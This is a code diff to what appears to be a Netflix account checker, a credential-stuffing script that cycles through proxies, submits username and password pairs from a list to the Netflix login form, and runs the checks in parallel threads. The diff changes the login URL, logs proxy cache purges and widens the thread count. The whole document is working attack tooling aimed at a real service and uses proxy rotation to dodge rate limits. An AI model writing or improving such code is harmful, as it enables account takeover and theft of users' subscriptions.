@@ -120,10 +120,13 @@ def check_available_proxie_in_queue(proxy: str) -> bool:
     global LAST_USED_PROXIES
     if len(LAST_USED_PROXIES) > 0 and  proxy in LAST_USED_PROXIES: return False
     return True
-    
+   
 def purge_last_used_proxes() -> None:
     global LAST_USED_PROXIES
-    if len(LAST_USED_PROXIES) > 0: LAST_USED_PROXIES.clear()
+    last_used_proxies_length = len(LAST_USED_PROXIES)
+    if last_used_proxies_length > 0: 
+        print(Fore.CYAN, f'   Cleared oproxies {last_used_proxies_length}')
+        LAST_USED_PROXIES.clear()
 
 def build_proxy_address(proxy: tuple) -> str:
     return f'http://{proxy[0]}:{proxy[1]}'
@@ -176,7 +179,7 @@ def check_account(account: tuple, proxy: dict) -> None:
 
     
     try:
-        br.open('https://www.netflix.com/co-en/login')
+        br.open('https://www.netflix.com/fr/login')
         br.select_form(nr=0)
         br.form["userLoginId"] = account[0]
         br.form["password"] = account[1]
@@ -204,11 +207,11 @@ def check_accounts(accounts: list[tuple], proxies: list[tuple]) -> None:
     available_cores: int = chek_available_cores()
     purgued_accounts: list[tuple] = accounts.copy() 
     available_threads = check_available_threads(available_cores=available_cores)
-    init_schedule(purge_last_used_proxes, 2)
+    init_schedule(purge_last_used_proxes, 3)
     try:
         while len(purgued_accounts) > 0:
             active_threads: list = []
-            for i in range(0, 3):
+            for i in range(0, available_threads):
                 proxy = generate_request_proxy(proxies=proxies)
                 if(proxy == None):
                     raise ValueError("Non available proxies")
